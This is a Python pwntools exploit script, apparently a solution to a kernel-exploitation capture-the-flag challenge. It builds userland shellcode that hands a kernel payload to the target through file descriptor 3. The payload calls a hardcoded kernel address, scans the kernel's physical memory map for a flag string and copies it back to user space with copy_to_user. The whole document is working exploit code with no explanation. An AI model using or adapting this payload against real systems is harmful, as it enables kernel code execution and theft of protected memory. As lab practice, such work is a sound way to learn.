#!/bin/python

import os 
import sys
import fcntl
from pwn import * 

context.arch = 'amd64'

MEM_START = 0x31337000
MEM_SIZE  = 0x1000
COPY_TO_USER = 0xffffffff813b0f20


kernel_sc_asm = asm(f'''
    mov rax, 0xffffffff810bc8e0
    call rax

    mov    rcx,0xffff888000000000
    movabs rdi,       0x07ffe0000

    movabs rax,0xfffffffeffffffff 

    add    rdi,rcx 
    cmp    rax,rcx 
    jb     RESULT_TO_USER 
    movabs r8,0x6c6c6f632e6e7770 

    jmp    LOOP_BODY
    nop    DWORD PTR [rax+rax*1+0x0] 

LOOP:
    add    rcx,0x1000 
    cmp    rcx,rdi 
    jae    RET

LOOP_BODY:
    lea    rsi,[rcx+0x40] 
    cmp    QWORD PTR [rcx+0x40],r8 
    jne    LOOP
    cmp    DWORD PTR [rsi+0x8],0x7b656765 
    jne    LOOP 

RESULT_TO_USER:
    mov    edx,0x80 
    mov    edi, {MEM_START + MEM_SIZE - 128} 
    mov    rax, {COPY_TO_USER}
    call   rax

RET:
    ret
''')

kernel_sc_len = len(kernel_sc_asm)
#print("Len of kernel asm: " + str(kernel_sc_len))

sc_asm  = asm(shellcraft.write(3, MEM_START + 0x50, kernel_sc_len)
            + shellcraft.write(1, MEM_START + MEM_SIZE - 128, 128))
sc_asm += cyclic(0x50 - len(sc_asm)) + kernel_sc_asm
                        
with open('shellcode', 'wb') as f:
    f.write(sc_asm)

#argv = [sys.argv[1]]
#if (len(sys.argv) > 2):
#    argv.insert(0, 'strace')
#    argv.insert(0, 'sudo')

#proc = process(argv)
#proc.send(sc_asm)
#proc.interactive()
